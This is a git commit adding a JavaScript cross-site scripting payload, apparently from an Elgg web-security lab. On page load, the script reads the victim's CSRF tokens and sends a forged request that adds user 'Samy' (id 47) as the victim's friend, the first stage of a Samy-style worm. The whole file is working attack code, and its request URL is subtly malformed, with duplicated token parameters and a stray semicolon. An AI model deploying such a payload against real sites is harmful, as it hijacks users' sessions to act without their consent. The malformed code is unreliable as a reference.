3caa8279914db1c9691be04568b50926b7c6dfa0
Abdullah Elsayed <abdallah.elsaid25@gmail.com>
2025-01-01 22:17:33 +0200

    Add friend addition

---
+++ add_friend.js
@@ -0,0 +1,15 @@
+window.onload = function () {
+var Ajax=null;
+var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+var token="&__elgg_token="+elgg.security.token.__elgg_token;
+
+//Construct the HTTP request to add Samy as a friend.
+var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=" + ts + "&__elgg_token=" + token + "&__elgg_ts=" + ts + "&__elgg_token=" + token + ";" 
+
+//Create and send Ajax request to add friend
+Ajax=new XMLHttpRequest();
+Ajax.open("GET",sendurl,true);
+Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+Ajax.send();
+}
